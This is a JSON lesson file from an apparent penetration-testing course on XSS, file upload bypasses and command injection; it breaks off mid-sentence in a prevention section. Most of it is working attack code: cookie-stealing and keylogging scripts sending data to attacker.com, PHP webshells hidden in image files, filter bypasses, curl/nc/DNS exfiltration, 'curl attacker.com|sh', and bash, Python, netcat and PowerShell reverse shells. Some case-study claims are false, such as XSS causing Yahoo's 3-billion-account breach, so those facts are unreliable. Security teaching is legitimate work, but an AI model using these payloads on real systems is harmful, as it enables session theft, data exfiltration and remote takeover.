{
  "lesson_id": "796a92e2-dd80-4df5-a729-803dd46f57d1",
  "domain": "pentest",
  "title": "Advanced Web Attacks: XSS, File Upload & Command Injection",
  "difficulty": 2,
  "order_index": 7,
  "prerequisites": [
    "lesson_pentest_05",
    "lesson_pentest_06"
  ],
  "concepts": [
    "Cross-Site Scripting (XSS) - Stored, Reflected, DOM-based",
    "XSS Filter and WAF Bypass Techniques",
    "Content Security Policy (CSP) Bypass",
    "File Upload Vulnerabilities and Filter Bypasses",
    "Magic Byte Manipulation and Polyglot Files",
    "Command Injection and OS Command Bypass",
    "Server-Side Template Injection (SSTI)",
    "XML External Entity (XXE) Injection",
    "Server-Side Request Forgery (SSRF)",
    "Insecure Deserialization Attacks"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Master all three types of XSS attacks and exploitation techniques",
    "Learn to bypass file upload filters using extension tricks and magic bytes",
    "Understand command injection and bypass techniques for restricted shells",
    "Exploit Server-Side Template Injection in Jinja2, Twig, and other engines",
    "Perform XXE attacks to read local files and perform SSRF",
    "Identify and exploit insecure deserialization vulnerabilities",
    "Chain multiple vulnerabilities for maximum impact"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6f",
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to the world of advanced web exploitation! You've mastered SQL injection - now it's time to expand your arsenal with attacks that target different layers of the application stack.\n\nThis lesson covers critical vulnerabilities that appear consistently in penetration tests:\n\n✓ **Cross-Site Scripting (XSS)** - Inject JavaScript to steal cookies, hijack sessions, and deface websites\n✓ **File Upload Attacks** - Bypass filters to upload webshells and achieve remote code execution\n✓ **Command Injection** - Break out of application logic to execute arbitrary OS commands\n✓ **Server-Side Template Injection** - Exploit template engines for RCE\n✓ **XXE Injection** - Read local files and perform SSRF through XML parsing\n✓ **Insecure Deserialization** - Exploit object serialization for RCE\n\nThese aren't theoretical attacks - they're used in real-world breaches daily:\n\n• **Yahoo (2013)**: XSS in email allowed attackers to steal 3 billion user accounts\n• **Equifax (2017)**: Command injection in Apache Struts led to 147 million records stolen\n• **Capital One (2019)**: SSRF in AWS metadata service exposed 100 million customer records\n\nBy the end of this lesson, you'll understand how these attacks work, how to exploit them, and how to chain them for maximum impact.\n\nRemember: These are powerful techniques. Use them ethically, only on systems you're authorized to test.\n\nLet's dive in!"
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d70",
      "type": "explanation",
      "content": {
        "text": "## Cross-Site Scripting (XSS) Deep Dive\n\nCross-Site Scripting allows attackers to inject malicious JavaScript into web applications, executing in victims' browsers.\n\n### **Three Types of XSS**\n\n**1. Reflected XSS**\n\nMalicious script is reflected off the web server (e.g., in search results, error messages).\n\n**Example:**\n```html\n<!-- Vulnerable PHP code -->\n<h1>Search Results for: <?php echo $_GET['query']; ?></h1>\n\n<!-- Normal request -->\nhttp://target.com/search?query=laptop\nOutput: <h1>Search Results for: laptop</h1>\n\n<!-- XSS attack -->\nhttp://target.com/search?query=<script>alert(document.cookie)</script>\nOutput: <h1>Search Results for: <script>alert(document.cookie)</script></h1>\n```\n\n**Real-world exploitation:**\n```javascript\n// Steal cookies and send to attacker\nhttp://target.com/search?query=<script>fetch('http://attacker.com/?c='+document.cookie)</script>\n\n// Redirect to phishing page\nhttp://target.com/search?query=<script>window.location='http://attacker.com/phish'</script>\n\n// Keylogger\nhttp://target.com/search?query=<script>document.onkeypress=function(e){fetch('http://attacker.com/?key='+e.key)}</script>\n```\n\n**2. Stored XSS (Persistent XSS)**\n\nMalicious script is stored on the server (e.g., in database, comments, user profiles) and executed whenever page is viewed.\n\n**Example:**\n```html\n<!-- Vulnerable blog comment system -->\n<div class=\"comment\">\n<strong><?php echo $comment['author']; ?></strong>:\n<?php echo $comment['text']; ?>\n</div>\n\n<!-- Malicious comment -->\nAuthor: Attacker\nText: Great post! <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>\n\n<!-- Every user viewing comments gets exploited -->\n```\n\n**Real-world impact:**\n- **Samy Worm (MySpace 2005)**: Stored XSS added 1 million friends in 20 hours\n- **TweetDeck (2014)**: Stored XSS in tweets caused mass account compromise\n\n**3. DOM-based XSS**\n\nVulnerability exists in client-side JavaScript code that processes user input.\n\n**Example:**\n```javascript\n<!-- Vulnerable JavaScript -->\n<script>\n// Get URL parameter\nconst username = new URLSearchParams(window.location.search).get('user');\n// Unsafely insert into DOM\ndocument.getElementById('welcome').innerHTML = 'Welcome, ' + username;\n</script>\n\n<!-- Attack -->\nhttp://target.com/profile?user=<img src=x onerror=alert(document.cookie)>\n```\n\n**Common vulnerable JavaScript sinks:**\n```javascript\n// Dangerous functions that execute code\ndocument.write(userInput);\nelement.innerHTML = userInput;\nelement.outerHTML = userInput;\neval(userInput);\nsetTimeout(userInput, 1000);\nsetInterval(userInput, 1000);\nlocation.href = userInput;\n```\n\n### **XSS Filter Bypass Techniques**\n\n**1. Encoding Bypass**\n\n```javascript\n// HTML encoding\n&lt;script&gt;alert(1)&lt;/script&gt;\n\n// URL encoding\n%3Cscript%3Ealert(1)%3C%2Fscript%3E\n\n// Double URL encoding\n%253Cscript%253Ealert(1)%253C%252Fscript%253E\n\n// Hex encoding\n<script>alert(\\x31)</script>\n\n// Unicode encoding\n<script>\\u0061lert(1)</script>\n\n// Base64 encoding (with eval)\n<img src=x onerror=eval(atob('YWxlcnQoMSk='))>  <!-- alert(1) in base64 -->\n```\n\n**2. Tag Variation**\n\nIf `<script>` is blocked, use alternative tags:\n\n```html\n<!-- Image tag with onerror -->\n<img src=x onerror=alert(1)>\n\n<!-- SVG tag -->\n<svg onload=alert(1)>\n\n<!-- Body tag -->\n<body onload=alert(1)>\n\n<!-- Input tag -->\n<input onfocus=alert(1) autofocus>\n\n<!-- Details tag (auto-opens) -->\n<details open ontoggle=alert(1)>\n\n<!-- Iframe tag -->\n<iframe src=javascript:alert(1)>\n\n<!-- Object tag -->\n<object data=javascript:alert(1)>\n\n<!-- Embed tag -->\n<embed src=javascript:alert(1)>\n```\n\n**3. Event Handler Variation**\n\nHundreds of JavaScript event handlers can execute code:\n\n```html\n<!-- Mouse events -->\n<div onmouseover=alert(1)>Hover me</div>\n<div onclick=alert(1)>Click me</div>\n\n<!-- Keyboard events -->\n<input onkeydown=alert(1)>\n\n<!-- Form events -->\n<form onsubmit=alert(1)><input type=submit></form>\n\n<!-- Media events -->\n<audio src=x onerror=alert(1)>\n<video src=x onerror=alert(1)>\n\n<!-- Animation events -->\n<div onanimationstart=alert(1) style=\"animation:x\">Test</div>\n\n<!-- Less common events -->\n<marquee onstart=alert(1)>Text</marquee>\n<select onfocus=alert(1) autofocus>\n```\n\n**4. Bypassing Word Filters**\n\nIf specific words like \"alert\", \"script\", \"onerror\" are filtered:\n\n```javascript\n// Case variation (if filter is case-sensitive)\n<sCrIpT>alert(1)</sCrIpT>\n\n// Comment insertion\n<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>\n\n// Null byte injection\n<scri\\x00pt>alert(1)</scri\\x00pt>\n\n// Using alternative functions\n<img src=x onerror=confirm(1)>  <!-- instead of alert -->\n<img src=x onerror=prompt(1)>\n<img src=x onerror=console.log(1)>\n\n// String concatenation\n<script>eval('al'+'ert(1)')</script>\n<script>window['al'+'ert'](1)</script>\n\n// Using Character codes\n<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>\n<!-- String.fromCharCode(97,108,101,114,116,40,49,41) = alert(1) -->\n\n// JSFuck (JavaScript with only 6 characters: []()!+)\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]]\n```\n\n**5. Context-Specific Bypasses**\n\n**Inside HTML attributes:**\n```html\n<!-- Breaking out of attribute -->\n<input value=\"USER_INPUT\">\nPayload: \"><script>alert(1)</script>\nResult: <input value=\"\"><script>alert(1)</script>\">\n\n<!-- Without closing quote (if quotes are filtered) -->\n<input value=USER_INPUT>\nPayload: x onmouseover=alert(1) x\nResult: <input value=x onmouseover=alert(1) x>\n```\n\n**Inside JavaScript strings:**\n```javascript\n<script>\nvar name = 'USER_INPUT';\n</script>\n\n<!-- Breaking out of string -->\nPayload: '; alert(1); //\nResult: var name = ''; alert(1); //';\n\n<!-- Without breaking string (if quotes are escaped) -->\nPayload: \\'; alert(1); //\n```\n\n### **Content Security Policy (CSP) Bypass**\n\nCSP restricts sources of executable scripts. Let's bypass it.\n\n**Common CSP header:**\n```\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com\n```\n\n**Bypass techniques:**\n\n**1. JSONP endpoints on trusted domains:**\n```javascript\n// If https://trusted.com has JSONP endpoint\n<script src=\"https://trusted.com/jsonp?callback=alert\"></script>\n\n// Common JSONP endpoints:\n<script src=\"https://www.google.com/complete/search?client=chrome&q=hello&jsonp=alert\"></script>\n<script src=\"https://apis.google.com/js/platform.js?callback=alert\"></script>\n```\n\n**2. AngularJS sandbox bypass (older versions):**\n```javascript\n// CSP: script-src 'self'\n<!-- Include AngularJS from self -->\n<script src=\"/angular.min.js\"></script>\n<div ng-app ng-csp>\n{{constructor.constructor('alert(1)')()}}\n</div>\n```\n\n**3. Base tag injection:**\n```html\n<!-- Change base URL to attacker-controlled domain -->\n<base href=\"http://attacker.com/\">\n<script src=\"/trusted-script.js\"></script>\n<!-- Loads http://attacker.com/trusted-script.js instead of local file -->\n```\n\n**4. Dangling markup injection:**\n```html\n<!-- Leak data to attacker-controlled domain -->\n<img src='http://attacker.com/?leak=\n<!-- Browser will include everything until next quote in URL -->\n```\n\n### **Advanced XSS Payloads**\n\n**1. Cookie Stealer:**\n```javascript\n<script>\nfetch('http://attacker.com/?c=' + document.cookie);\n</script>\n\n// Shorter version\n<script>fetch('//attacker.com/?c='+document.cookie)</script>\n\n// Image tag version (works without <script>)\n<img src=x onerror=\"this.src='http://attacker.com/?c='+document.cookie\">\n```\n\n**2. Session Hijacking:**\n```javascript\n<script>\n// Steal localStorage tokens\nfetch('http://attacker.com/?token=' + localStorage.getItem('auth_token'));\n\n// Steal sessionStorage\nfetch('http://attacker.com/?session=' + sessionStorage.getItem('session_id'));\n</script>\n```\n\n**3. Keylogger:**\n```javascript\n<script>\ndocument.onkeypress = function(e) {\nfetch('http://attacker.com/?key=' + e.key);\n}\n</script>\n```\n\n**4. Phishing (credential harvester):**\n```javascript\n<script>\ndocument.body.innerHTML = `\n<h1>Session Expired - Please Re-Login</h1>\n<form action=\"http://attacker.com/phish\" method=\"POST\">\n<button>Login</button>\n</form>\n`;\n</script>\n```\n\n**5. BeEF (Browser Exploitation Framework) Hook:**\n```javascript\n<script src=\"http://attacker.com:3000/hook.js\"></script>\n<!-- Gives attacker full control over victim's browser -->\n```\n\n**6. Defacement:**\n```javascript\n<script>\ndocument.body.innerHTML = '<h1>Hacked by Attacker</h1><img src=\"http://attacker.com/logo.png\">';\n</script>\n```"
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Advanced Web Attacks: XSS, File Upload & Command Injection Overview",
        "url": "https://www.youtube.com/embed/fNzpcB7ODxQ",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d71",
      "type": "memory_aid",
      "content": {
        "text": "**Memory Aid: XSS Types - \"RSD\" Framework**\n\n**R**eflected - URL parameter → immediate response (phishing links)\n**S**tored - Database → persistent (worms, mass exploitation)\n**D**OM-based - Client-side JavaScript → no server interaction\n\n**Quick test payloads:**\n```\nReflected:  <script>alert(1)</script> in URL parameters\nStored:     <img src=x onerror=alert(1)> in comments/profile\nDOM:        Inspect JavaScript for innerHTML/eval/document.write\n```\n\n**Bypass techniques - \"TECC\" framework:**\n\n**T**ag variation - <img>, <svg>, <iframe>, <body>, <input>\n**E**ncoding - URL, HTML, Unicode, Hex, Base64\n**C**ontext breaking - Escape quotes: '; alert(1); //\n**C**SP bypass - JSONP on trusted domains, base tag injection\n\n**Remember:** \"If <script> blocked, try <img>. If alert blocked, try String.fromCharCode!\"\n\n**Most reliable XSS test:**\n```\n<img src=x onerror=alert(1)>\n```\nWhy? Works in HTML context, doesn't require <script> tag, triggers automatically."
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d72",
      "type": "explanation",
      "content": {
        "text": "## File Upload Vulnerabilities\n\nFile upload features are common in web applications (profile pictures, document uploads, etc.). When improperly secured, they allow attackers to upload malicious files.\n\n### **Attack Objective: Upload Webshell for Remote Code Execution**\n\n**Simple PHP webshell:**\n```php\n<?php system($_GET['cmd']); ?>\n\n// Usage: http://target.com/uploads/shell.php?cmd=whoami\n```\n\n### **File Upload Filter Bypass Techniques**\n\n**1. Extension Bypass**\n\nMany applications check file extensions to block dangerous files.\n\n**Common blacklists:**\n```\nBlocked: .php, .php3, .php4, .php5, .phtml, .exe, .sh\n```\n\n**Bypass techniques:**\n\n**A. Case manipulation:**\n```\nshell.pHp\nshell.PhP\nshell.PHP\n```\n\n**B. Double extensions:**\n```\nshell.php.jpg\nshell.php.png\n# If server only checks last extension, may be interpreted as PHP\n```\n\n**C. Null byte injection (older PHP versions < 5.3):**\n```\nshell.php%00.jpg\n# PHP processes it as shell.php (stops at null byte)\n```\n\n**D. Alternative PHP extensions:**\n```\nshell.php3\nshell.php4\nshell.php5\nshell.phtml\nshell.phar\nshell.phpt\n```\n\n**E. Server-specific extensions:**\n```\nApache: .htaccess to enable PHP processing on .jpg files\nIIS: .asp, .aspx, .cer, .asa\nJSP: .jsp, .jspx, .jsw, .jsv, .jspf\n```\n\n**F. Adding trailing characters:**\n```\nshell.php.\nshell.php::\nshell.php[\nshell.php]\nshell.php;\n# Some parsers strip these characters\n```\n\n**2. Content-Type Bypass**\n\nApplications may check the HTTP Content-Type header.\n\n**Bypass:**\n```http\nPOST /upload HTTP/1.1\nHost: target.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: image/jpeg  <!-- Lie about content type -->\n\n<?php system($_GET['cmd']); ?>\n------WebKitFormBoundary--\n```\n\n**3. Magic Byte Bypass**\n\nApplications may check file signatures (magic bytes) to validate file type.\n\n**File signatures (magic bytes):**\n```\nJPEG: FF D8 FF E0\nPNG:  89 50 4E 47 0D 0A 1A 0A\nGIF:  47 49 46 38 39 61 (GIF89a)\nPDF:  25 50 44 46 (%PDF)\n```\n\n**Creating polyglot file (valid image + PHP code):**\n\n**Method 1: Add PHP code after image data:**\n```bash\n# Create valid JPEG with embedded PHP\ncp legitimate_image.jpg shell.php.jpg\necho '<?php system($_GET[\"cmd\"]); ?>' >> shell.php.jpg\n\n# The file is a valid JPEG (opens in image viewers)\n# AND valid PHP (executes code when accessed as PHP)\n```\n\n**Method 2: Use exiftool to inject PHP in metadata:**\n```bash\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.php.jpg\n\n# Access: http://target.com/uploads/shell.php.jpg?cmd=whoami\n```\n\n**Method 3: GIF + PHP polyglot:**\n```php\nGIF89a<?php system($_GET['cmd']); ?>\n```\nSave as `shell.gif.php` - valid GIF header + PHP code.\n\n**4. Path Traversal in Filename**\n\nUpload file to a different directory (e.g., web root).\n\n```http\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../var/www/html/shell.php\"\n```\n\nIf server doesn't sanitize filename, file may be saved outside upload directory.\n\n**5. Race Condition (File Upload + Execution)**\n\nSome applications validate files AFTER upload:\n\n```\n1. Upload shell.php → Temporarily saved as /tmp/upload_abc123.php\n2. Application validates file\n3. If valid, moves to /uploads/\n4. If invalid, deletes file\n```\n\n**Exploitation:**\n```bash\n# Terminal 1: Upload malicious file in loop\nwhile true; do\ncurl -F \"file=@shell.php\" http://target.com/upload\ndone\n\n# Terminal 2: Try to access file before deletion\nwhile true; do\ncurl http://target.com/uploads/shell.php?cmd=whoami\ndone\n\n# Race condition: Access file between upload and deletion\n```\n\n**6. .htaccess Upload (Apache)**\n\nUpload `.htaccess` file to enable PHP execution on image files:\n\n```apache\n# .htaccess content\nAddType application/x-httpd-php .jpg .png .gif\n```\n\nUpload this as `.htaccess`, then upload `shell.jpg` with PHP code - Apache will execute it as PHP.\n\n**7. SVG File Upload (XSS)**\n\nSVG files can contain JavaScript:\n\n```xml\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n<rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);\" />\n<script type=\"text/javascript\">\nalert(document.cookie);\n</script>\n</svg>\n```\n\nUpload as `xss.svg` - when viewed in browser, JavaScript executes.\n\n### **Advanced File Upload Attacks**\n\n**1. ASP.NET ViewState Deserialization**\n\nUpload web.config to enable dangerous ViewState settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n<system.web>\n<customErrors mode=\"Off\"/>\n<httpRuntime requestValidationMode=\"0.0\" />\n</system.web>\n</configuration>\n```\n\n**2. ZIP File Upload (Path Traversal)**\n\nIf application extracts uploaded ZIP files:\n\n```bash\n# Create ZIP with path traversal\nln -s ../../../etc/passwd link.txt\nzip --symlinks shell.zip link.txt\n\n# Or use evilarc\npython evilarc.py -o unix -p 'var/www/html/' shell.php\n# Creates ZIP that extracts to /var/www/html/shell.php\n```\n\n**3. ImageTragick (ImageMagick RCE)**\n\nExploit ImageMagick vulnerabilities (CVE-2016-3714):\n\n```\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://attacker.com/shell.php?x=`whoami`'\npop graphic-context\n```\n\nSave as `exploit.mvg`, upload - ImageMagick executes system command.\n\n### **Real-World File Upload Exploitation Workflow**\n\n```bash\n# Step 1: Identify upload functionality\nBurp Suite > Proxy > Intercept upload request\n\n# Step 2: Test basic upload\nUpload: legitimate_image.jpg\nCheck: Access uploaded file at /uploads/legitimate_image.jpg\n\n# Step 3: Test extension filtering\nUpload: shell.php\nResult: Blocked? Try bypasses (shell.php.jpg, shell.pHp, etc.)\n\n# Step 4: Test magic byte check\nUpload: shell.php with JPEG magic bytes\nGIF89a<?php system($_GET['cmd']); ?>\n\n# Step 5: Test content-type validation\nModify Content-Type header to image/jpeg\n\n# Step 6: Test path traversal\nFilename: ../../../var/www/html/shell.php\n\n# Step 7: If all fail, try .htaccess + image upload\nUpload: .htaccess (AddType application/x-httpd-php .jpg)\nUpload: shell.jpg (PHP code)\nAccess: /uploads/shell.jpg?cmd=whoami\n```"
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d73",
      "type": "code_exercise",
      "content": {
        "text": "## File Upload Bypass Challenge\n\n**Scenario:** You're testing a web application with file upload functionality. The upload feature has multiple security controls:\n- Blacklists `.php` extensions\n- Checks Content-Type header (must be image/*)\n- Validates file magic bytes (must be valid image)\n- Stores files in `/var/www/html/uploads/`\n\n**Goal:** Upload a PHP webshell and achieve RCE.\n\n**Challenge Steps:**\n\n**Step 1: Create polyglot PHP-JPEG file**\n```bash\n# Start with valid JPEG\ncp /usr/share/pixmaps/kali-logo.jpg shell.jpg\n\n# Add PHP code to end\necho '<?php system($_GET[\"cmd\"]); ?>' >> shell.jpg\n\n# Verify it's still valid JPEG\nfile shell.jpg\n# Output: shell.jpg: JPEG image data...\n\n# The file opens as image AND executes as PHP\n```\n\n**Step 2: Capture upload request in Burp Suite**\n```http\nPOST /upload.php HTTP/1.1\nHost: target.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.jpg\"\nContent-Type: image/jpeg\n\n[JPEG magic bytes + PHP code]\n------WebKitFormBoundary--\n```\n\n**Step 3: Try alternative PHP extensions**\n```http\n<!-- Test .phtml extension -->\nfilename=\"shell.phtml\"\n\n<!-- Test .php5 extension -->\nfilename=\"shell.php5\"\n\n<!-- Test double extension -->\nfilename=\"shell.php.jpg\"\n```\n\n**Step 4: If extensions blocked, upload .htaccess**\n```apache\n# Create .htaccess file\nAddType application/x-httpd-php .jpg .png .gif\n\n# Upload as .htaccess\nfilename=\".htaccess\"\nContent-Type: text/plain\n\nAddType application/x-httpd-php .jpg\n```\n\n**Step 5: Upload polyglot JPEG-PHP with .jpg extension**\n```http\nPOST /upload.php HTTP/1.1\nHost: target.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.jpg\"\nContent-Type: image/jpeg\n\nÿØÿà<?php system($_GET['cmd']); ?>\n------WebKitFormBoundary--\n```\n\n**Step 6: Access uploaded shell**\n```bash\n# After uploading .htaccess and shell.jpg:\ncurl \"http://target.com/uploads/shell.jpg?cmd=whoami\"\n# Output: www-data\n\ncurl \"http://target.com/uploads/shell.jpg?cmd=cat+/etc/passwd\"\n# Output: [contents of /etc/passwd]\n\n# Reverse shell\ncurl \"http://target.com/uploads/shell.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261'\"\n```\n\n**Alternative Method: exiftool injection**\n```bash\n# Inject PHP in image metadata\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' legitimate.jpg -o shell.jpg\n\n# Upload shell.jpg (passes all checks)\n# Include file to execute PHP in metadata:\nhttp://target.com/uploads/shell.jpg?cmd=whoami\n```\n\n**Practice Questions:**\n\n1. Why does adding PHP code to the end of a JPEG file work?\n2. What's the difference between .php and .phtml extensions?\n3. How does .htaccess enable PHP execution on .jpg files?\n4. What magic bytes identify a JPEG file?\n5. How would you bypass file size restrictions?\n\n**Answers:**\n\n1. Image parsers stop reading at end-of-image marker; PHP parser continues and executes code after image data.\n2. .phtml is alternative PHP extension, often forgotten in blacklists, processed identically to .php by Apache.\n3. .htaccess AddType directive tells Apache to treat .jpg files as PHP scripts, executing them through PHP interpreter.\n4. JPEG magic bytes: FF D8 FF E0 (first 4 bytes). Adding these to any file makes it appear as JPEG to magic byte checks.\n5. Compress PHP code, use short tags <?=`$_GET[cmd]`?>, or split upload across multiple requests."
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d74",
      "type": "explanation",
      "content": {
        "text": "## Command Injection\n\nCommand injection occurs when applications pass unsanitized user input to system shell commands.\n\n### **Basic Command Injection**\n\n**Vulnerable PHP code:**\n```php\n<?php\n$ip = $_GET['ip'];\n$output = shell_exec(\"ping -c 4 \" . $ip);\necho $output;\n?>\n```\n\n**Exploitation:**\n```bash\n# Normal usage\nhttp://target.com/ping.php?ip=8.8.8.8\n# Executes: ping -c 4 8.8.8.8\n\n# Command injection (using semicolon)\nhttp://target.com/ping.php?ip=8.8.8.8; whoami\n# Executes: ping -c 4 8.8.8.8; whoami\n\n# Command injection (using pipe)\nhttp://target.com/ping.php?ip=8.8.8.8 | whoami\n# Executes: ping -c 4 8.8.8.8 | whoami\n\n# Command injection (using AND)\nhttp://target.com/ping.php?ip=8.8.8.8 && whoami\n# Executes: ping -c 4 8.8.8.8 && whoami\n```\n\n### **Command Injection Operators**\n\n| Operator | Description | Example |\n|----------|-------------|--------|\n| `;` | Command separator | `cmd1; cmd2` |\n| `&&` | AND (execute cmd2 if cmd1 succeeds) | `cmd1 && cmd2` |\n| `||` | OR (execute cmd2 if cmd1 fails) | `cmd1 || cmd2` |\n| `|` | Pipe (pass cmd1 output to cmd2) | `cmd1 | cmd2` |\n| `` `cmd` `` | Command substitution | `` `whoami` `` |\n| `$(cmd)` | Command substitution | `$(whoami)` |\n| `&` | Background execution | `cmd1 & cmd2` |\n| `\\n` | Newline (command separator) | `cmd1\\ncmd2` |\n\n### **Command Injection Bypass Techniques**\n\n**1. Space Filtering Bypass**\n\nIf spaces are filtered:\n\n```bash\n# Using $IFS (Internal Field Separator)\nhttp://target.com/ping?ip=8.8.8.8;cat$IFS/etc/passwd\n\n# Using tabs\nhttp://target.com/ping?ip=8.8.8.8;cat%09/etc/passwd\n\n# Using brace expansion\nhttp://target.com/ping?ip=8.8.8.8;{cat,/etc/passwd}\n\n# Using $IFS with offset\nhttp://target.com/ping?ip=8.8.8.8;cat${IFS}/etc/passwd\n```\n\n**2. Keyword Filtering Bypass**\n\nIf commands like \"cat\", \"whoami\", \"nc\" are filtered:\n\n```bash\n# Using wildcards\nhttp://target.com/ping?ip=8.8.8.8;c?t /etc/passwd\nhttp://target.com/ping?ip=8.8.8.8;/b??/c?t /etc/passwd\n\n# Using string concatenation\nhttp://target.com/ping?ip=8.8.8.8;ca''t /etc/passwd\nhttp://target.com/ping?ip=8.8.8.8;ca\"\"t /etc/passwd\n\n# Using variable expansion\nhttp://target.com/ping?ip=8.8.8.8;a=c;b=at;$a$b /etc/passwd\n\n# Using escape characters\nhttp://target.com/ping?ip=8.8.8.8;c\\at /etc/passwd\n\n# Using hex encoding\nhttp://target.com/ping?ip=8.8.8.8;`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`\n# base64 decode of: cat /etc/passwd\n\n# Using environment variables\nhttp://target.com/ping?ip=8.8.8.8;$USER\nhttp://target.com/ping?ip=8.8.8.8;${SHELL:0:1}  # Expands to /\n```\n\n**3. Special Character Filtering Bypass**\n\nIf `/`, `.`, `-` are filtered:\n\n```bash\n# Bypass / filtering (directory separator)\ncd home||cd etc;cat passwd  # Use relative paths\ncat $(pwd | cut -c 1)etc$(pwd | cut -c 1)passwd  # Extract / from pwd output\n\n# Bypass . filtering (current directory)\ncd `echo $PWD`  # Use $PWD variable\n\n# Bypass - filtering (command options)\ncat /etc/passwd | head \"\" -n 5  # Empty string before -n\n```\n\n**4. Input Length Restrictions**\n\nIf input length is limited:\n\n```bash\n# Download and execute script\nwget attacker.com/s -O/tmp/s;sh /tmp/s\n\n# Using curl (shorter)\ncurl attacker.com|sh\n\n# Single character commands\nw  # who is logged in\nid  # current user\npwd  # current directory\n```\n\n### **Advanced Command Injection Techniques**\n\n**1. Blind Command Injection (no output)**\n\nWhen command output isn't displayed:\n\n**Time-based detection:**\n```bash\n# Test with sleep command\nhttp://target.com/ping?ip=8.8.8.8;sleep 5\n# If response delayed by 5 seconds, command injection confirmed\n\n# DNS exfiltration\nhttp://target.com/ping?ip=8.8.8.8;nslookup $(whoami).attacker.com\n# Check DNS logs for: www-data.attacker.com\n\n# HTTP exfiltration\nhttp://target.com/ping?ip=8.8.8.8;curl attacker.com/$(whoami)\n# Check web server logs for: GET /www-data\n\n# File-based exfiltration\nhttp://target.com/ping?ip=8.8.8.8;whoami>/var/www/html/out.txt\n# Access: http://target.com/out.txt\n```\n\n**2. Out-of-Band (OOB) Data Exfiltration:**\n```bash\n# Using curl to exfiltrate /etc/passwd\nhttp://target.com/ping?ip=8.8.8.8;curl -d @/etc/passwd attacker.com\n\n# Using netcat\nhttp://target.com/ping?ip=8.8.8.8;cat /etc/passwd | nc attacker.com 4444\n\n# Using DNS TXT records\nhttp://target.com/ping?ip=8.8.8.8;nslookup -type=txt $(cat /etc/passwd | base64).attacker.com\n```\n\n**3. Reverse Shells:**\n```bash\n# Bash reverse shell\nhttp://target.com/ping?ip=8.8.8.8;bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\n\n# Python reverse shell\nhttp://target.com/ping?ip=8.8.8.8;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n# Netcat reverse shell\nhttp://target.com/ping?ip=8.8.8.8;nc -e /bin/bash attacker.com 4444\n\n# PowerShell reverse shell (Windows)\nhttp://target.com/ping?ip=8.8.8.8;powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n```\n\n### **Real-World Command Injection Case Study: Shellshock (2014)**\n\n**CVE-2014-6271 - Bash vulnerability allowing arbitrary command execution**\n\n**Vulnerable Bash versions:** < 4.3\n\n**Exploitation:**\n```bash\n# Normal environment variable\nexport VAR=\"Hello\"\n\n# Shellshock exploit (execute command via environment variable)\nexport VAR=\"() { :; }; echo Vulnerable\"\n# Bash executes \"echo Vulnerable\" when VAR is set\n\n# CGI script exploitation\ncurl -A \"() { :; }; /bin/bash -c 'cat /etc/passwd'\" http://target.com/cgi-bin/status\n# User-Agent header sets environment variable, triggering command execution\n\n# DHCP exploitation (setting hostname)\ndhclient -e \"() { :; }; /bin/bash -c 'nc attacker.com 4444 -e /bin/bash'\"\n```\n\n**Impact:** Millions of servers compromised, used in botnets (Bashlite, Mirai).\n\n### **Command Injection Prevention**\n\n**1. Input validation (whitelist):**\n```php\n// 